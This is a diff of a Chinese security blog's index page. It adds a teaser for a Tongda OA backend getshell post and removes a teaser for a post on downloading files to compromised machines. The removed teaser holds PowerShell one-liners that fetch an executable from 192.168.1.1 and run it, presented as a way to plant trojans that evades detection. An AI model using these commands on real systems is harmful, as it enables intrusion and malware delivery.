@@ -185,6 +185,81 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/%E9%80%9A%E8%BE%BEOA3.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="TBOsec">
+      <meta itemprop="description" content="网络安全、渗透测试、编程语言、Writeup，随便写写，记录一些东西">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="TBOsec的网络日志">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/%E9%80%9A%E8%BE%BEOA3.html" class="post-title-link" itemprop="url">通达OA 后台GetShell</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-05-16 19:12:20" itemprop="dateCreated datePublished" datetime="2020-05-16T19:12:20+08:00">2020-05-16</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%80%9A%E8%BE%BEOA/" itemprop="url" rel="index"><span itemprop="name">通达OA</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="0x01-如何后台"><a href="#0x01-如何后台" class="headerlink" title="0x01 如何后台"></a>0x01 如何后台</h3><p>怎么进入后台随便你，可以利用前段时间的<code>任意用户登录漏洞</code></p>
+<p><img src="../images/upload/loginadmin.png" alt="login"></p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/%E9%80%9A%E8%BE%BEOA3.html#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/%E9%80%9A%E8%BE%BEOA2.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -468,85 +543,6 @@
   
   
 
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/shell%E4%B8%8B%E8%BD%BD.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="TBOsec">
-      <meta itemprop="description" content="网络安全、渗透测试、编程语言、Writeup，随便写写，记录一些东西">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="TBOsec的网络日志">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/shell%E4%B8%8B%E8%BD%BD.html" class="post-title-link" itemprop="url">shell中文件下载方法</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2020-04-04 09:59:20" itemprop="dateCreated datePublished" datetime="2020-04-04T09:59:20+08:00">2020-04-04</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/network/" itemprop="url" rel="index"><span itemprop="name">network</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p><font color=green>获得目标一定权限后可以下载木马或其它工具到目标机。下面列举了一些常用方法</font></p>
-<h3 id="Powershell："><a href="#Powershell：" class="headerlink" title="Powershell："></a>Powershell：</h3><p>下载并保存文件：（容易被杀毒软件检测）</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell (<span class="built_in">new-object</span> System.Net.WebClient).DownloadFile(<span class="string">'http://192.168.1.1/1.exe'</span>,<span class="string">'C:\test\1.exe'</span>)</span><br></pre></td></tr></table></figure>
-
-<p>下载并执行文件：（无文件模式不易检测）</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell (<span class="built_in">new-object</span> System.Net.WebClient).DownloadFile(<span class="string">'http://192.168.1.1/1.exe'</span>,<span class="string">'C:\test\1.exe'</span>);<span class="built_in">start-process</span> <span class="string">'C:\test\1.exe'</span></span><br></pre></td></tr></table></figure>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2020/shell%E4%B8%8B%E8%BD%BD.html#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
   </div>
 
   
@@ -618,7 +614,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
           <a href="/archives">
-          <span class="site-state-item-count">16</span>
+          <span class="site-state-item-count">17</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
